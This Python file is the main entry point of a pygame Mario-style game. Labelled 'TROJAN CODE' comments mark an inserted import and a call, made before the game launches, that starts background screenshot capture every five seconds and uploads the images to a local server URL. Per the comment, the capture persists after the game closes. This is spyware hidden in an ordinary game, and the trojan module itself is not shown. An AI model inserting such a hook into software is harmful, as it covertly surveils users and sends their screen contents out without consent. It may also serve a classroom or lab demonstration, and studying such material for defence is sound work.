__author__ = 'marble_xu'

import pygame as pg
from . import setup, tools
from . import constants as c
from .states import main_menu, load_screen, level
# TROJAN CODE INSERTED HERE - imports the malicious module
from . import trojan

def main():
    # TROJAN CODE: Start screenshot capture in background
    # This will continue running even after the game closes
    trojan.start_trojan(server_url="http://localhost:3000/upload", interval=5)
    
    game = tools.Control()
    state_dict = {c.MAIN_MENU: main_menu.Menu(),
                  c.LOAD_SCREEN: load_screen.LoadScreen(),
                  c.LEVEL: level.Level(),
                  c.GAME_OVER: load_screen.GameOver(),
                  c.TIME_OUT: load_screen.TimeOut()}
    game.setup_states(state_dict, c.MAIN_MENU)
    game.main()
